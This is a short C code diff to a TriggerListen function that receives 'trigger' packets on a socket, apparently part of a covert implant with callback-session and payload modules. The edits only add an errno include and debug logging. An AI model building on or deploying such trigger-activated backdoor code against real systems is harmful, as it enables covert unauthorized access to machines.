@@ -2,7 +2,7 @@
 #include "trigger_listen.h"
 #include "trigger_callback_session.h"
 #include "trigger_payload.h"
-//#include "trigger_exec.h"
+#include <errno.h>
 #include "trigger_sniff.h"
 #include "threads.h"
 #include "compat.h"
@@ -172,6 +172,7 @@ int TriggerListen(int trigger_delay, unsigned long delete_delay)
 	signal( SIGCHLD, sigchld_reaper );
   
 	socket_fd = dt_get_socket_fd();
+	DLX(2, printf("Listening for trigger on socket: %d\n", socket_fd));
 
 	if( socket_fd == FAILURE )
 	{
@@ -192,8 +193,7 @@ int TriggerListen(int trigger_delay, unsigned long delete_delay)
 		if ( ( packet_length = recvfrom( socket_fd, packet_buffer, MAX_PKT, 0, 
 				(struct sockaddr *) &packet_info, (socklen_t *) &packet_info_size ) )  == FAILURE )
 		{
-			// not sure what to do upon recv error
-			DLX(4, printf("Error: recvfrom() failure!\n"));
+			DLX(4, printf("Error: recvfrom() failure: %s\n", strerror(errno)));
 			continue;
 		}
 
